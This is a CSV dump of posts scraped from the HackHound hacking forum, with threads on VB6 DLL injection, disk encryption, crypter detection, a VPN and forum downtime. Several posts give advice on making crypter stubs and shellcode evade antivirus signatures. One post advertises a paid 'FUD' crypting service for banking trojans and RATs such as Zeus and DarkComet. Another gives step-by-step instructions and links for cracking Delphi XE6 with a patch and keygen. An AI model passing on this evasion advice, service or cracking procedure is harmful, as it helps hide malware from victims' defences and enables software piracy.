subforum,threadTitle,authorName,postdatetime,flatcontent,userTitle
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/4/2014 0:00,"Using these settings, when the DLL is compiled and injected into notepad, Notepad crashes. If i add ""/DEF:""Pathtodeffile"" A def file, to specify the functions in the DLL, i cant access the functions even from a VB6 exe. Edited by Lesk, 04 June 2014 - 06:43 PM.",Member
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/4/2014 0:00,,Member
"Encrypt HDD - Forensics, Data Destruction & Recovery - HackHound",encrypt-hdd,x58,6/4/2014 0:00,"Fellas Truecrypt isn't secure anymore. It used to be a my favorite one, but ---- http://truecrypt.sourceforge.net/ Bitlocker doesn't give me the feeling that it really is secure. It's closed source and it is made by Microsoft... Tells enough does it? .. Sucks to see TrueCrypt die like this.",Advanced
"Encrypt HDD - Forensics, Data Destruction & Recovery - HackHound",encrypt-hdd,LeFF,6/4/2014 0:00,"AxCrypt can be use for per-file encryption... but I don't use it, because it is windows only... also look at alternatives to TrueCrypt...",Expert
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,karcrack,6/4/2014 0:00,"You cannot call APIs like that. You're calling DllFunctionCall@MSVBVM60 when you do it that way, so it won't work injected. You need to create a TLB so the VB6 compiler is able to define your needed APIs in the IAT. Not easy but fun",AdvancedMember
Manually Crypt Nj-Rat - Malware Related Tools - HackHound,manually-crypt-nj-rat,Tigerass,6/4/2014 0:00,Doing an long time test on nodistribute since a few months already. After some AV Updates even one detection less... Personally I don't think they distribute. I really wanna see some proofs for this. I can't find them. I believe some skids only cried because av signatures got updated after they checked their file. As pong said. Crypters aren't undetected forever. I really wanna know who started with this NOD IS TRIBUTE shit.,Newbie
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/5/2014 0:00,"You cannot call APIs like that. You're calling DllFunctionCall@MSVBVM60 when you do it that way, so it won't work injected. You need to create a TLB so the VB6 compiler is able to define your needed APIs in the IAT. Not easy but fun Sorry to be a pain in the ass, but could you elaborate a little",Member
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/5/2014 0:00,"Actually don't tell me, i am getting somewhere now Hopefully ill be able to get it done.",Member
[nod32]in32/Injector.BDJK detection - General Discussion - HackHound,nod32in32injectorbdjk-detection,mosbecchi,6/6/2014 0:00,"Hi all, my crypter is detect by nod and ikarus with this signature: Win32/Injector.BDJK i have add fake api's and object into project.... i compile my stub with P-Code method but they detect the same.... help me please? tnk",Beginner
[nod32]in32/Injector.BDJK detection - General Discussion - HackHound,nod32in32injectorbdjk-detection,noh4t,6/6/2014 0:00,Fake apis can be detected dont use them try too make new string encoding better too make it dynamic,AdvancedMember
Blackness-Rat-v16 (Vbnet-Source) - Resources - HackHound,blackness-rat-v16-vbnet-source,ch0ke,6/6/2014 0:00,Thanks for sharing. Always wanted to know how RAT works.,Newbie
[nod32]in32/Injector.BDJK detection - General Discussion - HackHound,nod32in32injectorbdjk-detection,x58,6/6/2014 0:00,"Fake apis (this worked 7 years ago, not nowadays anymore) Fake objects and forms (yes this can confuse some emulators also wFormCount trick might still work) P-code or Native.. This makes not much sense, you might want to try magic linker and klinker(by Karkarck) And try to encode the shellcode and do a scan time av test again. This can be just a scantime detection. Meaning some part of the shellcode byte array (currency in vb6) is flagged.",Advanced
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/6/2014 0:00,"Okay so i have been reading and reading all day long, i have learnt ALOT about how the IDL works but i am finding glueing all of it together to get what i want pretty hard. Please can you spoon feed me some more master??",Member
Need to make Win32 DLL in VB6 - How can i do this? - General Discussion - HackHound,need-to-make-win32-dll-in-vb6-how-can-i-do-this,Lesk,6/6/2014 0:00,Maby someone can help me with this Please Login or Register to see this Hidden Content,Member
Humble Bundle Challange - Challenges - HackHound,humble-bundle-challange,IamLupo,6/7/2014 0:00,"Hey guys, I thought it would be fun to do a challange where you can win something! This time humble bundle link that has been encrypt. Your challange is to figure out what encryption there is on! The first how finds wins! Humble Bundle video: https://www.youtube....Q5GFmDvDuI&hd=1 Az3WyevOBeJ6teQV0RhA0KQs8Acs0JKf8A=mzJcDtbzdfOf8zeqOBefCBF1ffJQDyeKgzg=rCNfc PS: there are two encryption on it! Good luck!",IntermediateMember
Humble Bundle Challange - Challenges - HackHound,humble-bundle-challange,Hess,6/8/2014 0:00,"This looks funky , I might get try on this.",IntelligenceService
Delphi XE6 full - Development Software - HackHound,delphi-xe6-full,assasaha,6/9/2014 0:00,"Delphi XE6 Pull Versi Crack patch Serial Key And Keygen Tutorial Instalasi How to Use: 1. Install RAD Studio XE6 RTM with generated Serial Number!!! 2. Click ""Patch"". 3. Click ""Generate Activation File"". 4. Start RAD Studio. 5. If application crash or not start, exclude bds.exe from DEP. 6. If possible, block all internet access from the application! (recommended) NOTE: TES BY ME AND WORK! http://altd.embarcad...der_xe6_win.iso Pacth And Keygen http://www.4shared.c...a/CekakXE6.html",Beginner
Alternative InStr Function by iCode - General Discussion - HackHound,alternative-instr-function-by-icode,OXYMORON,6/9/2014 0:00,Thanks boss sorry but I'm still learning hopefully I'll get at your level someday I've tested this function but it doesn't work neither.. I'll debug my file to know what exactly fails and post back on here..,Member
Spotflux VPN ( 100% Free ) - Security Software - HackHound,spotflux-vpn-100-free,Hacker4Life,6/10/2014 0:00,"Hi, if you are looking for a nice VPN, cheap, you should try Spotflux VPN, a free software, very user-frendly... Take a look before spending money in some VPN, just check it out... Download Spotflux VPN ( Oficcial): http://www.spotflux.com/ by XtremeHacker",IntermediateMember
Spotflux VPN ( 100% Free ) - Security Software - HackHound,spotflux-vpn-100-free,rabinat0r,6/10/2014 0:00,"The price for privacy should never be an issue. And what is this? A ""vpn"" that filters my traffic from so called treats? Sounds more like USA/NSA marketing.bullshit to gather even more data.",IntermediateMember
The storm is over - DashBoard - HackHound,the-storm-is-over,mrtornado,6/10/2014 0:00,"Dear members, As you may have noticed, the last two days we had a lot of downtime, this was because of a massive storm that went over HackHound's server of hacked embedded devices. We now have solved the issue so far, Ravage has migrated us to Cloudflare so we stay online for a full day and don't get flooded again by bots that may connect later on. At this moment we are not sure if we will continue to use Cloudflare or not. But most likely we won't use it any longer than a week, as Cloudflare causes a lot of other small issues. And it's not comfortable to type those captchas each time when you post a reply/topic. Sorry for the inconvenience. I'm sure if this is your site, your are flooded because you kidda are a dick, if this is not you're forum I apologize to the owner",Banned
The storm is over - DashBoard - HackHound,the-storm-is-over,Tigerass,6/10/2014 0:00,"I'm sure if this is your site, your are flooded because you kidda are a dick, if this is not you're forum I apologize to the owner Hm I think it was because of me His stealer was shit. We all know that. And lol at calling an admin an dick Please don't dig up old threads.",Member
The storm is over - DashBoard - HackHound,the-storm-is-over,mrtornado,6/10/2014 0:00,"I just typed the truth it wasn't an insult or anything, he knows what I'm talking about",Banned
The storm is over - DashBoard - HackHound,the-storm-is-over,rabinat0r,6/10/2014 0:00,"I just typed the truth it wasn't an insult or anything, he knows what I'm talking about I don't get it, Tigerass doesn't get it, and i'm sure x58 won't get it either.",IntermediateMember
CryptUrSoft - Flea Market - HackHound,cryptursoft,sider,6/10/2014 0:00,"Our service provides the crypt of your files. For each customer manually is created STUB which help you to hide your file from AV (FUD). Supports all types of Windows (2000, XP, 7,8 ...x86 - x64). Icon Changer . Processing EOF & TLS The crypt was checked on Zeus, BetaBot, Citadel, DarkComet etc. Payment accepts only with BTC. Price Unique crypt - 25$. Support jabber: supCrypt4Ur@limun.org",Newbie
The storm is over - DashBoard - HackHound,the-storm-is-over,x58,6/10/2014 0:00,"I'm sure if this is your site, your are flooded because you kidda are a dick, if this is not you're forum I apologize to the owner That is fine for you, but what you say shows me what kind of person you are. A childish person, i either don't like a lot of people. Do i get mad then and flood websites and hax them? The answer is simple. No. Act like a mature man and stop acting like shit, think about it and grow up. And yea i can be a dick, but i have my reasons for that. You don't know whats going on here so, you should not insult people if you don't know their situation. People who behave like kinder garden won't be taken serious anymore we have had enough of all that bs. I don't get it, Tigerass doesn't get it, and i'm sure x58 won't get it either. I think it's because of this. But you know what starts to get old? People never read, they don't take the effort for it. The posts people make are irrelevant and i see it as useless space. Just frustrating..",Advanced
The storm is over - DashBoard - HackHound,the-storm-is-over,Ravage,6/10/2014 0:00,"I just typed the truth it wasn't an insult or anything, he knows what I'm talking about But I don't. Get out of here. Thanks",Expert
Spotflux VPN ( 100% Free ) - Security Software - HackHound,spotflux-vpn-100-free,Hacker4Life,6/11/2014 0:00,"The price for privacy should never be an issue. And what is this? A ""vpn"" that filters my traffic from so called treats? Sounds more like USA/NSA marketing.bullshit to gather even more data. Should never be an issue, but there are many people that cant affort software, and they can have privacy too, with some tips from us... Once again, I never post nothing that I dont know what am I talking about, and instead of saying haters bla bla bla, do it, after you finished your homework about it... And thanks once again for being usefull for everybody, you are too kind my great great friend... Keep being usefull, helping us with all your heart....... by XtremeHacker",IntermediateMember
